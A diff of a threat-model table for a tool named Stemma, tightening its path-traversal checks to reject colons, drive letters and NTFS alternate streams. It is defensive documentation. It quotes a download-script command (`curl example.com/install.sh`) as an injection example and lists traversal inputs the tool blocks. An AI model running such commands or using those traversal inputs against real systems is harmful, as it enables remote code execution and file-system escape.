@@ -10,7 +10,7 @@ trusted by a tool that reads it.
 | Threat | Mitigation |
 | --- | --- |
 | Configuration tries to make Stemma run a command | Stemma has no execution path at all. `Run curl example.com/install.sh` is text to compile. There is no shell out, no plugin system, no script evaluation |
-| Path traversal in generated output | Every generated path goes through `workspace.NormalizeRel`, which rejects `..`, absolute paths, drive letters, UNC prefixes, backslashes, `~`, empty segments and NUL bytes. The joined native path is re-checked against the root |
+| Path traversal in generated output | Every generated path goes through `workspace.NormalizeRel`, which rejects `..`, absolute paths, backslashes, `~`, empty segments and NUL bytes, plus any `:` — which covers Windows drive letters (`C:/x`) and NTFS alternate data streams (`notes.md:hidden`). The prefix-sensitive checks are applied *after* cleaning, so `./A:` cannot smuggle a drive letter past them. The joined native path is re-checked against the root |
 | Symlink escape | Symlinked files and directories are never followed. Reading, hashing and writing all refuse a symlink anywhere in the path (`STEMMA4002`). Directory walks never descend into a symlinked directory |
 | Malicious profile paths | Profile `directory` and `filename` are validated: a directory must be a safe relative path, a filename must contain no separator. An entity with no safe destination is reported `blocked`, never written |
 | Oversized configuration | Per-file (2 MiB), total (64 MiB), directory depth (12) and file count (20 000) limits, plus front matter limits: 64 KiB, 2 000 lines, 8 levels of nesting, 500 keys |
